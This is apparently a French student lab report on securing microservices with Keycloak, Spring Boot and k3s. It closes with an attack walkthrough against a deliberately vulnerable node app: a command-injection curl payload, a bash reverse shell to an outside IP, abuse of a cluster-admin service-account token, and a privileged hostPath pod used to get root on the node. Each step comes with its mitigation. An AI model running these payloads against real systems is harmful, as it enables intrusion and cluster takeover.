# TP - Web Services Sécurisés avec Keycloak
> Luca CECCARELLI
> Celian CHAUSSON
> Lenny GONZALES

Architecture microservices à trois tiers : frontend statique, API REST Spring Boot, et serveur d'autorisation Keycloak.

## Problèmes rencontrées

### 1. Front - Back - Erreur CORS

Nous avons rencontré un problème de CORS (Cross-Origin Resource Sharing) en liant le front avec le back.
Pour résoudre ce problème, nous avons ajouté :

```java
public class SecurityConfig {
    ...

    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        configuration.setAllowedOrigins(List.of(
            "http://localhost:3000",
            "http://front.infres.fr.localhost"
        ));
        configuration.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "OPTIONS"));
        configuration.setAllowedHeaders(List.of("*"));
        configuration.setAllowCredentials(false);
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", configuration);
        return source;
    }
}
```

### 2. K3s - Front - Keycloak - Web crypto

Nous avons rencontré un problème pour la liaison entre le front et keycloak en utilisant k3s.
En effet, l'API Web crypto ne fonctionne qu'avec HTTPS, localhost ou le domaine .localhost.
Ainsi, par simplicité, nous avons choisit de modifié le domaine \*.infres.fr vers \*.infres.fr.localhost.

## Démarrage rapide

```bash
cp .env.example .env
docker compose up --build
```

Le backend attend que Keycloak soit `healthy` avant de démarrer (`depends_on: condition: service_healthy`).

**Compte de test :** `testuser` / `Test1234!`

---

## Tâches réalisées

### Tâche 1 - API REST de base

Projet Maven Spring Boot généré avec l'archétype `maven-archetype-webapp`, groupId `infres.ws.rest`, artifactId `java-rest-server`.

#### 1b - Hiérarchie de ressources REST

```bash
/api
└── /vol          GET → liste des vols disponibles
```

#### 1c/1d - Ressource `Vol` en JSON

Modèle Java (`Vol.java`) exposé en JSON via Jackson :

```java
record Vol(String compagnieAerienne, String numeroVol, String place, double prix, String date)
```

`GET /api/vol` retourne une liste statique de 3 vols (pas de base de données).

---

### Tâche 2 - Application JavaScript

Frontend HTML/JS vanilla servi par nginx (port 3000).

- Bouton "Récupérer les vols" -> `GET /api/vol` : affichage en tableau (compagnie, numéro de vol, place, date, prix)
- Aucun framework, aucune dépendance npm côté frontend applicatif

---

### Tâche 3 - Délégation OAuth 2.0 auprès de Google (remplacé par Keycloak)

#### 3a - Inscription auprès de Google

Un projet Google Cloud a été créé, l'API Google+ activée, et des credentials OAuth 2.0 récupérés (`client_id` + `client_secret`). L'URL de redirection `http://localhost:8080/api/login/oauth2/code/google` a été déclarée.

#### 3b/3c - Intégration Spring Security OAuth2 Client

Dépendance `spring-boot-starter-oauth2-client`. Spring Security gère automatiquement le flow Authorization Code. Le profil était récupéré depuis l'objet `OidcUser` (claims Google : `name`, `email`, `picture`) et renvoyé par `GET /api/profil`.

---

### Tâche 4 - Sécurisation de l'API REST via Keycloak (Resource Server)

#### 4a - Installation Keycloak

Keycloak tourne en Docker (`quay.io/keycloak/keycloak:latest`, mode dev). Il importe automatiquement le realm au démarrage via `--import-realm` et le volume `./keycloak:/opt/keycloak/data/import`.

**4b - Client `rest-api` (bearer-only)**

Déclaré dans `keycloak/realm-export.json` :

- Type : confidentiel, `bearerOnly: true`
- Tous les flows désactivés (pas de login direct, uniquement validation de tokens)

#### 4c - Configuration du backend comme Resource Server

Dépendance Maven : `spring-boot-starter-oauth2-resource-server` (standard Spring Security, pas d'adapter Keycloak propriétaire - les adapters Keycloak sont dépréciés).

`application.yml` :

```yaml
spring.security.oauth2.resourceserver.jwt.issuer-uri:
  ${KEYCLOAK_ISSUER_URI:http://localhost:8180/realms/microservices-realm}
```

`SecurityConfig.java` :

- Session `STATELESS`
- `oauth2ResourceServer(jwt -> {})` : chaque requête doit porter un Bearer JWT valide signé par Keycloak
- CSRF désactivé
- CORS : origine `http://localhost:3000` autorisée

`ProfilController.java` : `@AuthenticationPrincipal Jwt` -> claims `name`, `preferred_username`, `email`.

#### 4d - Validation

```bash
curl -i http://localhost:8080/api/profil                                  # 401 sans token
curl -H "Authorization: Bearer <token>" http://localhost:8080/api/profil  # 200
```

---

### Tâche 5 - Authentification du frontend via Keycloak

**5a - Client `web-app` (public)**

Déclaré dans `keycloak/realm-export.json` :

- Type : public (PKCE obligatoire, pas de secret côté client)
- `standardFlowEnabled: true` (Authorization Code Flow)
- `redirectUris: ["http://localhost:3000/*"]`
- `webOrigins: ["http://localhost:3000"]`

#### 5c - Flow d'authentification et récupération du JWT

```js
const keycloak = new Keycloak({
  url: 'http://localhost:8180',
  realm: 'microservices-realm',
  clientId: 'web-app'
});
keycloak.init({ onLoad: 'check-sso', pkceMethod: 'S256' });
```

- Bouton "Se connecter" -> `keycloak.login()` -> redirection Keycloak -> retour avec code d'autorisation -> échange contre un **JWT access token**
- `keycloak.tokenParsed` contient les claims JWT décodés (sub, name, email…), ID utilisateur visible directement
- Appels à `/api/profil` -> header `Authorization: Bearer <access_token>` (refresh auto si expiry < 30s)

#### Récapitulatif de la migration vers Keycloak

| Élément                 | Avant (Google)                     | Après (Keycloak)                         |
| ----------------------- | ---------------------------------- | ---------------------------------------  |
| Dépendance Maven        | `oauth2-client`                    | `oauth2-resource-server`                 |
| Mode session backend    | Stateful (session HTTP)            | Stateless (JWT Bearer)                   |
| Principal Spring        | `OidcUser`                         | `Jwt`                                    |
| Auth frontend           | Lien redirect Google               | `keycloak-js` (Authorization Code + PKCE)|
| Config`application.yml` | `clientId` / `clientSecret` Google | `issuer-uri` Keycloak                    |

---

### Tâche 6 - Analyse du token JWT Keycloak

#### 6a - Récupération du token

Après connexion, le token est accessible via les DevTools -> Onglet Réseau/Network -> requête vers `http://localhost:8180/realms/microservices-realm/protocol/openid-connect/token` -> champ `access_token` dans la réponse JSON.

#### 6b - Décodage sur jwt.io

En collant le token sur [https://jwt.io](https://jwt.io), on observe :

- **Header** :

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "jZBuyprLsyqxK16QQo4iqlsg45OJ7C62miui-rdEdsE"
}
```

- **Payload**:

```json
{
  "exp": 1782139759,
  "iat": 1782139459,
  "jti": "onrtac:dcf60127-c11a-1d13-cff7-8c492bdd13ec",
  "iss": "http://localhost:8180/realms/microservices-realm",
  "typ": "Bearer",
  "azp": "web-app",
  "sid": "q7Y8IQLk-8uJWuPcijrV6GeS",
  "allowed-origins": [
    "http://localhost:3000"
  ],
  "realm_access": {
    "roles": [
      "default-roles-demo-realm"
    ]
  },
  "scope": "openid profile email",
  "email_verified": true,
  "name": "Test User",
  "preferred_username": "testuser",
  "given_name": "Test",
  "family_name": "User",
  "email": "testuser@demo.local"
}
```

- **Signature** : vérifiable avec la clé publique du realm (`http://localhost:8180/realms/microservices-realm`)

---

### Tâche 7 - Contrat d'API OpenAPI / Swagger

#### 7a - Définition du contrat

Le contrat OpenAPI 3.0 de l'API est défini dans [openapi.yaml](openapi.yaml)

#### 7b - Génération depuis le contrat

Nous pouvons générer la documentation HTML et les librairies clientes via l'image Docker officielle `openapitools/openapi-generator-cli` :

```bash
# Documentation HTML
docker run --rm -v "${PWD}:/local" openapitools/openapi-generator-cli generate -i /local/openapi.yaml -g html2 -o /local/docs

# Client JavaScript (utilisé par le front)
docker run --rm -v "${PWD}:/local" openapitools/openapi-generator-cli generate \
  -i /local/openapi.yaml -g javascript -o /local/front/client-js \
  --additional-properties=usePromises=true,projectName=vols-api
```

Le front appelle l'API via `DefaultApi` (`front/client-js/src/api/DefaultApi.js`) : `getVols()` et `getProfil()`.

Ouvrir ensuite `./docs/index.html` dans le navigateur.

---

## Keycloak - Realm `microservices-realm`

| Élément          | Valeur                                        |
| ---------------- | --------------------------------------------- |
| Realm            | `microservices-realm`                         |
| Client API       | `rest-api` (bearer-only, confidentiel)        |
| Client Web       | `web-app` (public, Authorization Code + PKCE) |
| Utilisateur test | `testuser` / `Test1234!`                      |

Console d'administration : [http://localhost:8180/admin](http://localhost:8180/admin)

---

## Déploiement Kubernetes (k3s)

### 1. Résolution DNS locale

```bash
echo "$(hostname -I | awk '{print $1}') registry.infres.fr.localhost back.infres.fr.localhost front.infres.fr.localhost keycloak.infres.fr.localhost" | sudo tee -a /etc/hosts
```

### 2. Déploiement du registry Docker

```bash
kubectl apply -f k8s/DockerRegistry.yaml
kubectl get pods -l app=docker-registry
```

### 3. Build et import des images

```bash
docker compose build
docker save registry.infres.fr/back  | sudo k3s ctr images import -
docker save registry.infres.fr/front | sudo k3s ctr images import -
```

### 4. Déploiement des services

```bash
kubectl apply -f k8s/keycloak.yaml
kubectl apply -f k8s/back.yaml
kubectl apply -f k8s/front.yaml
kubectl apply -f k8s/back-hpa.yaml
kubectl apply -f k8s/front-hpa.yaml
kubectl apply -f k8s/keycloak-hpa.yaml
```

### 5. Vérification

```bash
kubectl get pods
kubectl get svc
kubectl get ingress
kubectl get hpa
```

### 6. Accès aux services

| Service   | URL                                                  |
|-----------|------------------------------------------------------|
| Frontend  | <http://front.infres.fr.localhost>                   |
| API REST  | <http://back.infres.fr.localhost/api>                |
| Keycloak  | <http://keycloak.infres.fr.localhost>                |
| Registry  | <http://registry.infres.fr.localhost/v2/_catalog>    |

**Admin Keycloak** : `admin` / `admin`
**Compte de test** : `testuser` / `Test1234!`

### 7. Nettoyage

```bash
kubectl delete -f k8s/
sudo /usr/local/bin/k3s-uninstall.sh
```


## Sécurité Kubernetes (k3s)

## Étape 1 : Déploiement de l'application vulnérable

- Build de l'image `registry.infres.fr/vulnnode` via `docker compose build`
- Push sur le registre k3s local via `docker compose push`
- Création du namespace `infres`, du ServiceAccount et du RoleBinding (`cluster-admin`)
- Déploiement du Deployment, Service et Ingress
- Ajout de `vulnnode.infres.fr` dans `/etc/hosts`

Ainsi,
```bash
curl -X POST http://vulnnode.infres.fr/post.html -d "lookup=google.com"
```
résout correctement le DNS.

## Étape 2 : Exploitation de l'injection de commandes

La vulnérabilité se situe à la ligne 16 du fichier `server.js` : `exec("nslookup " + host, ...)` sans vérification de la variable d'entrée `host`.

À partir de cela, nous pouvons mettre un `;` pour exécuter d'autres commandes :
```bash
curl -X POST http://vulnnode.infres.fr/post.html --data-urlencode "lookup=google.com; id"
```
`uid=1000(node) gid=1000(node)`

Ainsi, nous pouvons faire un reverse shell.
Sur notre machine (attaquant) :
```bash
nc -lvnp 9001
```

Payload :
```bash
curl -X POST http://vulnnode.infres.fr/post.html --data-urlencode "lookup=google.com; bash -c 'sh -i >& /dev/tcp/159.31.66.203/9001 0>&1'"
```

La connexion a été faites depuis `10.42.0.82:46442`.

Pour prévenir cela, nous pouvons utiliser `execFile()` avec des arguments séparés au lieu de concaténer l'input utilisateur avec une commande shell.

## Étape 3 : Credentials pour mouvement latéral

Le pod monte automatiquement le token du ServiceAccount `infres-serviceaccount` dans `/var/run/secrets/kubernetes.io/serviceaccount/token`.
Ce ServiceAccount est lié au rôle `cluster-admin` via le RoleBinding `infres-rbac`.

```bash
kubectl exec deploy/vulnnode -n infres -- sh -c "./kubectl auth can-i create pod"
# yes
```

Ainsi, nous avons un accès complet au cluster.

Pour prévenir cela, nous pouvons appliquer le principe du moindre privilège et ne jamais lier un ServiceAccount applicatif à `cluster-admin` (trop permissif).
De plus, nous pouvons utiliser KubiScan et Kubescape pour analyser les permissions RBAC régulièrement.

## Étape 4 : Escalade de privilèges

Depuis le pod vulnnode compromis, nous créons un pod privilégié :

```bash
kubectl exec deploy/vulnnode -n infres -- sh -c "
  cat > /tmp/priv.yaml <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: priv-pod
  namespace: infres
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
    - name: priv-container
      image: alpine
      command: ['/bin/sleep', 'infinity']
      securityContext:
        privileged: true
      volumeMounts:
        - name: host-root
          mountPath: /host
  volumes:
    - name: host-root
      hostPath:
        path: /
EOF
  ./kubectl apply -f /tmp/priv.yaml
  ./kubectl get pod priv-pod -n infres
"
```

Pour prévenir cela, nous pouvons utiliser Pod Security Standards (restricted) pour bloquer les pods privilégiés.

## Étape 5 : Connexion au nœud en root

```bash
kubectl exec -n infres priv-pod -- chroot /host /bin/sh -c "id && hostname"
```
`uid=0(root) gid=0(root)`, `hostname=pc-luca`

Grâce à cela, nous avons un accès root sur le nœud.